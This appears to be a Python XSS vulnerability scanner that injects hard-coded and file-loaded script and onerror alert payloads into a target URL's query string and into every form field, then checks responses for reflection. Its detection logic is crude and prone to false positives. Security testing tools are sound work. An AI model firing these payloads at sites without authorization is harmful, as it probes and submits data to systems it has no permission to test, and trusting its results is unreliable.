import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging
import time
import json

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to safely make HTTP GET requests
def get_request(url, delay=0.2, timeout=10, verify=True):
    try:
        response = requests.get(url, timeout=timeout, verify=verify)
        time.sleep(delay)  # Rate limiting
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching {url}: {e}")
        return None

# Function to load XSS payloads from a JSON file
def load_payloads(file_path="payloads.json"):
    try:
        with open(file_path, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.warning(f"Failed to load payloads from {file_path}: {e}. Using default payloads.")
        return {
            "basic": [
                "\"><script>alert('XSS')</script>",
                "\"><img src=x onerror=alert('XSS')>"
            ]
        }

# Function to inject payload into a URL
def inject_payload(url, payload):
    if "?" in url:
        return url + "&payload=" + payload
    else:
        return url + "?payload=" + payload

# Function to analyze the response for XSS vulnerabilities
def analyze_response(response, payload):
    if payload in response.text:
        if "<script>" in response.text or "alert(" in response.text or "onerror=" in response.text:
            return {'status': 'vulnerable', 'payload': payload}
        else:
            return {'status': 'reflected', 'payload': payload}
    return {'status': 'not_vulnerable', 'payload': payload}

# Function to scan a URL for XSS vulnerabilities
def scan_url(url, delay=0.2):
    results = {
        'basic': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
        'obfuscated': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
        'context_specific': {
            'html': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
            'javascript': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
            'attributes': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
            'url': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []}
        }
    }
    
    payloads = load_payloads()
    
    # Test basic payloads
    for payload in payloads.get('basic', []):
        injected_url = inject_payload(url, payload)
        response = get_request(injected_url, delay)
        if response:
            result = analyze_response(response, payload)
            results['basic'][result['status']].append(payload)

    # Test obfuscated payloads
    for payload in payloads.get('obfuscated', []):
        injected_url = inject_payload(url, payload)
        response = get_request(injected_url, delay)
        if response:
            result = analyze_response(response, payload)
            results['obfuscated'][result['status']].append(payload)

    # Test context-specific payloads
    for context, context_payloads in payloads.get('context_specific', {}).items():
        for payload in context_payloads:
            injected_url = inject_payload(url, payload)
            response = get_request(injected_url, delay)
            if response:
                result = analyze_response(response, payload)
                results['context_specific'][context][result['status']].append(payload)

    return results

# Function to scan forms for XSS vulnerabilities
def scan_forms_for_xss(url, payload):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            form_action = form.get('action', '')
            if not form_action.startswith('http'):
                form_action = urljoin(url, form_action)
            
            inputs = form.find_all('input')
            form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}
            
            # Inject payload into form data
            for key, value in form_data.items():
                form_data[key] = payload
            
            # Submit the form with injected payload
            response = requests.post(form_action, data=form_data)
            
            # Analyze the response for XSS vulnerabilities
            result = analyze_response(response, payload)
            if result['status'] == 'vulnerable':
                return f"XSS vulnerability found in form at {form_action}"
    except Exception as e:
        logging.error(f"Error scanning forms for XSS: {e}")
    return f"No XSS vulnerability found in form at {url}"

# Function to get XSS payloads
def get_xss_payloads():
    return load_payloads().get('basic', [])

# Main function to execute the scanner
if __name__ == "__main__":
    target_url = input("Enter the URL to scan for XSS vulnerabilities: ")
    results = scan_url(target_url)
    print("Scan Results:")
    print(json.dumps(results, indent=4))
    
    # Get a list of XSS payloads
    payloads = get_xss_payloads()
    
    # Scan forms for XSS vulnerabilities
    for payload in payloads:
        result = scan_forms_for_xss(target_url, payload)
        print(result)
